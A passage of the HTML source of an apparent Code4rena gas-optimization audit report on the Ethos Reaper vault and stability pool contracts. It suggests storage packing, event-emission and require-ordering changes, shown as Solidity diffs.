</span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol b/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index db020f2..a824d97 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -28,9 +28,9 @@ abstract contract ReaperBaseStrategyv4 is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address public want;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     bool public emergencyExit;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 public lastHarvestTimestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint64 public lastHarvestTimestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 public upgradeProposalTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint64 public upgradeProposalTime;</span></span></span></code></pre>\n<h2 id=\"pack-structs-by-putting-data-types-that-fit-together-next-to-each-othersaves-2k-gas\" style=\"position:relative;\"><a href=\"#pack-structs-by-putting-data-types-that-fit-together-next-to-each-othersaves-2k-gas\" aria-label=\"pack structs by putting data types that fit together next to each othersaves 2k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Pack structs by putting data types that fit together next to each other(Saves: 2K gas)</h2>\n<p>As the solidity EVM works with 32 bytes, variables less than 32 bytes should be packed inside a struct so that they can be stored in the same slot, this saves gas when writing to storage ~20000 gas</p>\n<h3 id=\"reapervaultv2sol-pack-activation-together-with-lastreportsave-1-slot-2k-gas\" style=\"position:relative;\"><a href=\"#reapervaultv2sol-pack-activation-together-with-lastreportsave-1-slot-2k-gas\" aria-label=\"reapervaultv2sol pack activation together with lastreportsave 1 slot 2k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultV2.sol: Pack activation together with lastReport(Save 1 SLOT: 2k gas)</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L25-L33\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L25-L33</a></p>\n<p><strong>activation and lastReport are timestamps thus changing them to uint64 should be safe for around 532 years</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">25</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">StrategyParams</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">26</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">activation</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Activation block.timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeBPS</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Performance fee taken from profit, in BPS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allocBPS</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Allocation in BPS of vault&#39;s total assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Amount of capital allocated to this strategy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">30</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gains</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Total returns that Strategy has realized for Vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">31</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">losses</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Total losses that Strategy has realized for Vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastReport</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// block.timestamp of the last time a report occured</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/ReaperVaultV2.sol b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5f2a58..44f84fb 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -23,13 +23,14 @@ contract ReaperVaultV2 is ReaperAccessControl, ERC20, IERC4626Events, AccessCont</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     using SafeERC20 for IERC20Metadata;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     struct StrategyParams {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 activation; // Activation block.timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint64 activation; // Activation block.timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint64 lastReport; // block.timestamp of the last time a report occured</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 feeBPS; // Performance fee taken from profit, in BPS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 allocBPS; // Allocation in BPS of vault&#39;s total assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 allocated; // Amount of capital allocated to this strategy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 gains; // Total returns that Strategy has realized for Vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 losses; // Total losses that Strategy has realized for Vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 lastReport; // block.timestamp of the last time a report occured</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h2 id=\"emitting-storage-values-instead-of-the-memory-one\" style=\"position:relative;\"><a href=\"#emitting-storage-values-instead-of-the-memory-one\" aria-label=\"emitting storage values instead of the memory one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Emitting storage values instead of the memory one.</h2>\n<p>Here, the values emitted shouldn’t be read from storage. The existing memory values should be used instead:</p>\n<h3 id=\"emit-_newtvlcap-instead-of-tvlcap\" style=\"position:relative;\"><a href=\"#emit-_newtvlcap-instead-of-tvlcap\" aria-label=\"emit _newtvlcap instead of tvlcap permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Emit <code>_newTvlCap</code> instead of <code>tvlCap</code></h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L578-L582\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L578-L582</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">578</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateTvlCap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newTvlCap</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">579</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_atLeastRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ADMIN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">580</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">tvlCap</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newTvlCap</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">581</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TvlCapUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tvlCap</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">582</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/ReaperVaultV2.sol b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5f2a58..c12e679 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/ReaperVaultV2.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -578,7 +578,7 @@ contract ReaperVaultV2 is ReaperAccessControl, ERC20, IERC4626Events, AccessCont</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function updateTvlCap(uint256 _newTvlCap) public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _atLeastRole(ADMIN);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         tvlCap = _newTvlCap;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        emit TvlCapUpdated(tvlCap);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit TvlCapUpdated(_newTvlCap);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L575-L579\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L575-L579</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StabilityPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">575</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newProductFactor</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">576</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentEpochCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">577</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">EpochUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">578</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">currentScale</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">579</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ScaleUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentScale</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>As currentScale is being assigned value 0, we should just emit the 0 here</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/StabilityPool.sol b/Ethos-Core/contracts/StabilityPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index db163b7..62c0042 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/StabilityPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/StabilityPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -576,7 +576,7 @@ contract StabilityPool is LiquityBase, Ownable, CheckContract, IStabilityPool {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             currentEpoch = currentEpochCached.add(1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             emit EpochUpdated(currentEpoch);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             currentScale = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            emit ScaleUpdated(currentScale);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            emit ScaleUpdated(0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             newP = DECIMAL_PRECISION;</span></span></span></code></pre>\n<h2 id=\"ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" style=\"position:relative;\"><a href=\"#ifsrequire-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" aria-label=\"ifsrequire statements that check input arguments should be at the top of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IF’s/require() statements that check input arguments should be at the top of the function</h2>\n<p>Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas) in a function that may ultimately revert in the unhappy case.</p>\n<h3 id=\"reorder-the-require-statement-to-have-cheaper-one-before-the-gas-consuming-one\" style=\"position:relative;\"><a href=\"#reorder-the-require-statement-to-have-cheaper-one-before-the-gas-consuming-one\" aria-label=\"reorder the require statement to have cheaper one before the gas consuming one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reorder the require statement to have cheaper one before the gas consuming one</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L46-L54\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L46-L54</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CollateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">47:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collaterals</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">48:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_MCRs</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">49:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_CCRs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Can only initialize once&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collaterals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;At least one collateral required&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_MCRs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_collaterals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Array lengths must match&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_CCRs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_collaterals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Array lenghts must match&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The first check <code>require(!initialized, \"Can only initialize once\");</code> involves reading from the state as <code>initialized</code> is a storage variable which is quite expensive. As we would also revert on the other conditions which involves reading function arguments(cheaper) we should reorder the checks as follows</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/CollateralConfig.sol b/Ethos-Core/contracts/CollateralConfig.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index d524f23..1458836 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/CollateralConfig.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/CollateralConfig.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -48,10 +48,10 @@ contract CollateralConfig is ICollateralConfig, CheckContract, Ownable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] calldata _MCRs,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] calldata _CCRs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(!initialized, &quot;Can only initialize once&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_collaterals.length != 0, &quot;At least one collateral required&quot;);</span></span></span>\n<span 